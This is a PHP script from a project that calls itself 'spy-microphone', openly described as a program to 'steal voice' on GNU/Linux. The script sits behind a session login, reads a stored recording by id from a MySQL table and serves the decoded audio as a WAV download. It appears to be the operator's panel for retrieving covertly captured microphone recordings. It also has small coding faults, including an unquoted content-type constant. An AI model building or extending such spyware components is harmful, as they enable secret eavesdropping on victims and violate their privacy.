<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }


     else
       {


if(isset($_GET['id']))
   {
    $id = intval($_GET['id']);
 
   
    if($id <= 0) 
   {
        die('The ID is invalid!');
    }

    else 
      {

         require_once('__ROOT__/connect.php');

         if (class_exists('DATABASE_CONNECT'))
            {
 
             $obj_conn  = new DATABASE_CONNECT;
            
             $host = $obj_conn->connect[0];
             $user = $obj_conn->connect[1];
             $pass = $obj_conn->connect[2];
             $db   = $obj_conn->connect[3];
 
            $conn = new mysqli($host,$user,$pass,$db);
 
             if ($conn->connect_error)
                   {
                    die ("Cannot connect " .$conn->connect_error);
                    }

               else
                {
        $sql= " SELECT instant, record FROM records WHERE id ='$id'";
        $result = $conn->query($sql);
 
        if($result) 
         {
                $row = $result->fetch_assoc();
 
             
                header("Content-Type: ". wav);
               // header("Content-Length: ". '222');
                header('Content-Disposition:attachment;filename="' .$row['instant'] .'"');
 
              
                echo base64_decode($row['record']);
            }

            else 
            {
                echo 'Error! No data exists with that ID.';
            }
 

        } //  end else of data
        
       } // end if class exists

      } // end else isset

        $conn->close();
    
   } //  end if isset

  } // end else login session

?>

